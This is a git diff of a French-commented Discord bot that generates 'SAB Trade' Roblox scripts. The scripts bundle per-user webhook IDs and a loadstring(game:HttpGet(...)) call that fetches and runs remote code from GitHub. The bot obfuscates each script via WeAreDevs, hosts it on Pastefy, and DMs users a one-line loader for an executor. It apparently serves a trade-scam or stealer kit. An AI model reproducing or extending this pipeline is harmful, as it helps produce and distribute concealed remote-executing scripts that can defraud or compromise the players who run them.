@@ -215,7 +215,7 @@ clientDiscord.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
     if (interaction.commandName === 'generate-sab-trade') {
-        // 1. On prévient Discord qu'on travaille (indispensable pour les traitements longs)
+        // 1. On prévient Discord qu'on travaille (indispensable pour éviter le timeout)
         try {
             await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
         } catch (err) {
@@ -229,7 +229,7 @@ clientDiscord.on(Events.InteractionCreate, async (interaction) => {
             const income = interaction.options.getInteger('income');
             const visual = interaction.options.getString('visual') || "";
             
-            // Génération de l'ID unique
+            // Génération de l'ID unique pour la base de données
             const webhookUuid = generateWebhookId();
 
             // 2. Sauvegarde en Base de données (MongoDB)
@@ -250,44 +250,59 @@ fenv["Visual"] = "${visual}"
 fenv["MinIncome"] = ${income}
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde"))()`;
 
-            // 4. Obfuscation via LuaObfuscator API
+            // 4. Obfuscation via WeAreDevs (Utilise tes cookies configurés sur Render)
             const obfuscated = await obfuscateScript(codeToObfuscate);
 
             if (!obfuscated) {
-                return await interaction.editReply("❌ Obfuscation failed. Please check server logs.");
+                return await interaction.editReply("❌ Obfuscation failed (WeAreDevs). Please check server logs.");
             }
 
-            // 5. Upload sur Pastefy
+            // 5. Upload sur Pastefy (Utilise ta PASTEFY_KEY)
             const pasteUrl = await uploadToPastefy(obfuscated, webhookUuid);
 
             if (!pasteUrl) {
                 return await interaction.editReply("⚠️ Obfuscation success, but Pastefy upload failed.");
             }
 
-            // 6. Réponse finale avec Embed professionnel
-            const successEmbed = new EmbedBuilder()
-                .setTitle("🛡️ Script Protected & Uploaded")
+            // 6. Préparation du résultat final
+            const finalLoadstring = `loadstring(game:HttpGet("${pasteUrl}", true))()`;
+            
+            const dmEmbed = new EmbedBuilder()
+                .setTitle("🚀 SAB Trade Script Ready")
                 .setColor(0x00FF00)
+                .setDescription("Copy and paste the code below into your executor:")
                 .addFields(
-                    { name: "🆔 Webhook ID", value: `\`${webhookUuid}\``, inline: true },
-                    { name: "🔗 Raw Link", value: `[Click to Copy](${pasteUrl})`, inline: true }
+                    { name: "📜 Script Code", value: `\`\`\`lua\n${finalLoadstring}\n\`\`\`` }
                 )
-                .setDescription("### 📋 Instructions\nCopy the link above and use it in your loader or executor.\n\n*Your script is now obfuscated and hosted safely.*")
-                .setFooter({ text: `Generated for ${interaction.user.tag}` })
+                .setFooter({ text: "SAB-Trade • System by Rusteez" })
                 .setTimestamp();
-
-            await interaction.editReply({ embeds: [successEmbed] });
+            
+            try {
+                // 7. Tentative d'envoi en DM
+                await interaction.user.send({ embeds: [dmEmbed] });
+            
+                // 8. Réponse éphémère de guidage
+                await interaction.editReply({ 
+                    content: `✅ **Script generated successfully!**\n\n> 📬 I've sent the execution code to your **Direct Messages (DMs)**.\n\n*If you don't see it, make sure your DMs are open.*` 
+                });
+            
+            } catch (error) {
+                // 9. Fallback si les DMs de l'utilisateur sont fermés
+                log(`⚠️ [DM ERROR] DMs closed for ${interaction.user.tag}`);
+                
+                await interaction.editReply({ 
+                    content: `⚠️ **Your DMs are closed!** I couldn't send the code privately.\n\nHere is your execution code:\n\`\`\`lua\n${finalLoadstring}\n\`\`\``
+                });
+            }
 
         } catch (error) {
-            log(`❌ [ERROR] ${error.message}`);
-            // Si on a déjà fait le deferReply, on utilise editReply pour l'erreur
+            log(`❌ [CRITICAL ERROR] ${error.message}`);
             if (interaction.deferred) {
-                await interaction.editReply(`❌ An error occurred: ${error.message}`).catch(() => null);
+                await interaction.editReply(`❌ A server error occurred: ${error.message}`);
             }
         }
     }
 });
-
 if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
 
 // --- GESTION WEBSOCKET ---
